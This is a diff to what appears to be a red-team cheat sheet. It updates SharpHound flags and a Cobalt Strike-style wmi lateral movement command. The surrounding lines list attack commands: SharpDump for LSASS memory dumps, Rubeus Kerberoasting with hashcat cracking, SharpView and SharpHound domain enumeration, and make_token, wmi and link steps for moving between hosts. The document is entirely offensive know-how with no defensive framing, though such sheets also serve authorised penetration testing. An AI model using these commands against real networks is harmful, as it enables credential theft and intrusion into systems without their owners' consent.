@@ -3,7 +3,7 @@ GhostPack Tools
   SharpUp.exe (Privesc Tool)
   SharpDump.exe (LSASS MiniDump Tool)
   SharpView.exe (Network Enumeration)
-  SharpHound.exe CollectionMethod All (SearchForest or Domain) Throttle 20 Jitter 7 EncryptZip ZipFileName C:\temp\stuff.zip NoSaveCache
+  SharpHound.exe -c All, Loggedon [-s|-d] --Throttle 20 --Jitter 7 --NoSaveCache --RandomFilenames --EncryptZip
   Rubeus.exe keberoast asreproast /format:hashcat /outfile:hashes.tx
     Hashcat -a0 -w3 -m 13100 [-r rules file] /path/to/hashes /path/to/dictionary
 
@@ -46,7 +46,7 @@ Lateral Movement
   make_token username password
   shell dir \\system\c$ (Check if admin)
   shell net use \\system\c$
-  wmi \\system listener (tab complete listener)
+  wmi system listener (tab complete listener)
   spawn x64 listener (New listerner that is not Powershell)
   unlink ip addr of attack system (from target; can tab complete)
   link ip addr of target system (from attack box; verify dual home IP addresses)
